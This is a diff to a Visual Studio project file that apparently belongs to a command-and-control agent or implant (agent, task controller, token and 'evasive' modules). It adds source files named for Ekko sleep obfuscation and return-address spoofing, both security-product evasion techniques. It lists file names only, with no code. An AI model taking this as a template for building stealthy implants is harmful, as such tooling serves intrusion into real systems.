@@ -144,6 +144,7 @@
   <ItemGroup>
     <ClCompile Include="agent.c" />
     <ClCompile Include="Crypto.c" />
+    <ClCompile Include="EkkoSleepObf.c" />
     <ClCompile Include="enum.c" />
     <ClCompile Include="evasive.c" />
     <ClCompile Include="Http.c" />
@@ -154,6 +155,8 @@
     <ClCompile Include="package.c" />
     <ClCompile Include="parser.c" />
     <ClCompile Include="RegisterAgent.c" />
+    <ClCompile Include="RetAddrSpoof.c" />
+    <ClCompile Include="SleepObfMain.c" />
     <ClCompile Include="TaskController.c" />
     <ClCompile Include="token.c" />
     <ClCompile Include="wolfssl\aes.c" />
@@ -187,14 +190,16 @@
     <ClInclude Include="agent.h" />
     <ClInclude Include="Common.h" />
     <ClInclude Include="Crypto.h" />
+    <ClInclude Include="EkkoSleepObf.h" />
     <ClInclude Include="enum.h" />
     <ClInclude Include="evasive.h" />
-    <ClInclude Include="Helpers.h" />
     <ClInclude Include="Http.h" />
     <ClInclude Include="ListManager.h" />
     <ClInclude Include="localcstd.h" />
     <ClInclude Include="package.h" />
     <ClInclude Include="parser.h" />
+    <ClInclude Include="RetAddrSpoof.h" />
+    <ClInclude Include="SleepObfMain.h" />
     <ClInclude Include="TaskController.h" />
     <ClInclude Include="token.h" />
     <ClInclude Include="wolfssl\openssl\compat_types.h" />
